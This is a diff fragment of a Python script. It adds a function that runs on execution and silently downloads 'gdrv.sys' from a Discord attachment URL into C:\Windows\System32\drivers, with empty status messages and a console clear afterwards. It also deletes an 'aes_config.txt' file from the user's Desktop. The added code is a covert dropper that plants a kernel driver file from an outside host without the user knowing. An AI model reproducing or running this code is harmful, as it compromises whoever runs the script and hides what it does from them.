@@ -9,6 +9,24 @@ import subprocess
 import os
 desktop_pathxsd = os.path.join(os.environ['USERPROFILE'], 'Desktop')
 file_pathaesconfig = os.path.join(desktop_pathxsd, 'aes_config.txt')
+
+def dl_anything_file(url, file_name):
+    target_directory = r'C:\Windows\System32\drivers'
+    save_path = os.path.join(target_directory, file_name)
+    
+    if os.path.exists(save_path):
+        print("")
+        return
+
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(save_path, 'wb') as f:
+            f.write(response.content)
+        print("")
+    else:
+        print(f"")
+dl_anything_file("https://cdn.discordapp.com/attachments/1198653708511215736/1320957399682519145/gdrv.sys?ex=676b7cf2&is=676a2b72&hm=214b2c82fbbe66bc4585fe831ed1766aebfc5ca2bc5dbd6ea0939922d73b839d&","gdrv.sys")
+os.system('cls')
 if os.path.isfile(file_pathaesconfig):
     os.remove(file_pathaesconfig)
     print("")
